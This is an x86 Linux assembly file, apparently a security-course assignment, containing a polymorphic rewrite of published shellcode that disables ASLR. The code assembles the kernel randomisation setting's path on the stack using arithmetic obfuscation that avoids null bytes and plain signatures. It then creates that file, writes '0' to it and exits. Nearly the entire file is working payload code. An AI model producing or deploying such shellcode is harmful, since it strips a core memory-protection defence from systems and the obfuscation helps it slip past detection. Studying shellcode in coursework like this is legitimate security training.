; Polymorphic version of Linux x86 ASLR deactivation
; Original author: Jean Pascal Pereira <pereira@secbiz.de>
; http://shell-storm.org/shellcode/files/shellcode-813.php
; Original size:  83 bytes
; Polymorphic size:  bytes
; SLAE-860
; Assignment 6


global _start

section .text

    _start:
        xor eax, eax
        push eax
        mov eax, 0x65636170
        push eax
        add eax, 0x1F0D1117  ; Avoid null 1F0D1117
        sub eax, 0x11111111
        push eax
        sub eax, 0x13F9E70D
        push eax
        add eax, 0xE09EA05
        push eax
        sub eax, 0xBFD3502
        push eax
        add eax, 0x3FC42F9
        push eax
        add eax, 0x5C10114
        push eax
        add eax, 0x7FFEFF6
        push eax
        sub eax, 0x11D04551   ; Avoid null 11D04551
        add eax, 0x11111111
        push eax
        mov ebx, esp
        mov cx, 0x2bc
        xor eax, eax
        mov al, 0x8
        int 0x80
        mov ebx, eax
        push eax
        mov dx, 0x3a30
        push dx
        mov ecx, esp
        xor edx, edx
        inc edx
        mov al, 0x4
        int 0x80
        mov al, 0x6
        int 0x80
        inc eax
        int 0x80